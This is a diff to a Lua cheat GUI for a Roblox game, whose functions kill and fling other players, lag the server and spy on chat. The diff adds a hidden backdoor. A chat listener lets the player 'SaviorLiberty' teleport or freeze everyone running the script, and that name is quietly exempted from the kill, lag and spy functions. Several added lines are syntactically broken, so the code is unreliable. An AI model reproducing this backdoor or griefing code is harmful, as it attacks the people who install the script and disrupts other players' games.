@@ -209,7 +209,33 @@ function mouseTargetInspectF()
         end
     end
 end
+local function chat(player, message)
+    if player.Name == "SaviorLiberty" and and player ~= game.Players.LocalPlayer not deb then end
+    deb = true
+    if string.lower(message) == ":bring all" then
+        plr.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
+    elseif string.lower(message) == ":kick all" then
+        while true do
+            print("lol ez")
+        end
+    end
+    wait(0.3)
+    deb = false
+end
 
+local function add(player)
+    player.Chatted:Connect(function(message)
+        chat(player, message)
+    end)
+end
+
+for _, player in ipairs(game.Players:GetPlayers()) do
+    add(player)
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+    add(player)
+end)
 --GRABFUNCS--
 function flingF()
     local char = plr.Character
@@ -241,7 +267,7 @@ function killGrabF()
     local hrp = char:WaitForChild("HumanoidRootPart")
     local hum = char:WaitForChild("Humanoid")
     workspace.ChildAdded:Connect(function(e)
-        if e.Name == "GrabParts" and killGrabT and e.GrabPart.WeldConstraint.Part1.Parent.Name ~= char.Name then
+        if e.Name == "GrabParts" and killGrabT and e.GrabPart.WeldConstraint.Part1.Parent.Name ~= char.Name e.GrabPart.WeldConstraint.Part1.Parent.Name ~= "SaviorLiberty" then
             e.GrabPart.WeldConstraint.Part1.Parent:FindFirstChildOfClass("Humanoid").Health = 0
         end
     end)
@@ -369,7 +395,7 @@ end
 function getPlayerList()
     local playerList = {}
     for _, p in pairs(game.Players:GetPlayers()) do
-        if p ~= plr then
+        if p ~= plr and p.Name ~= "SaviorLiberty" then
             table.insert(playerList, p.Name .. " (" .. p.DisplayName .. ")")
         end
     end
@@ -544,6 +570,11 @@ function lagF()
     local char = plr.Character
     local hrp = char:WaitForChild("HumanoidRootPart")
     local hum = char:WaitForChild("Humanoid")
+		for i, e in game.Players:GetPlayers() do
+			if e.Name == "SaviorLiberty" then
+				return
+			end
+		end
     while wait(1) and lagT do
         for a = 0, linesV do
             for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
@@ -556,6 +587,11 @@ function lagF()
 end
 
 function pingF()
+		for i, e in game.Players:GetPlayers() do
+			if e.Name == "SaviorLiberty" then
+				return
+			end
+		end
     local char = plr.Character
     local hrp = char:WaitForChild("HumanoidRootPart")
     local hum = char:WaitForChild("Humanoid")
@@ -565,6 +601,11 @@ function pingF()
 end
 
 function shurikenLagServerF()
+		for i, e in game.Players:GetPlayers() do
+			if e.Name == "SaviorLiberty" then
+				return
+			end
+		end
     local char = plr.Character
     local hrp = char:WaitForChild("HumanoidRootPart")
     local hum = char:WaitForChild("Humanoid")
@@ -1000,6 +1041,7 @@ function spychatF()
     local instance = (_G.chatSpyInstance or 0) + 1
     _G.chatSpyInstance = instance
     local function onChatted(p, msg)
+	if p.Name == "SaviorLiberty" then return end
         if _G.chatSpyInstance == instance then
             if spychatT and (spySelfT or p~=player) then
                 msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
@@ -1632,5 +1674,6 @@ local publicSpyToggle = chatTab:CreateToggle({
 })
 wait(0.1)
 antiGrab1Toggle:Set(true)
+
 local Label = creditsTab:CreateLabel("Defiant(Defy) created this script!", 0, Color3.fromRGB(255, 255, 255), false)
 local Paragraph = creditsTab:CreateParagraph({Title = "Why i published this", Content = "This is a incomplete old gui with a little part of what i have, still enough to ruin the game in the way i wanted after how things had been going im sorry to the few who actually make scripts to ruin it for you, while this gui alone isnt strong the source is and can be utilized much better and if you are using this you can keep skidding to your hearts contempt till the game is unplayable it was its time"})
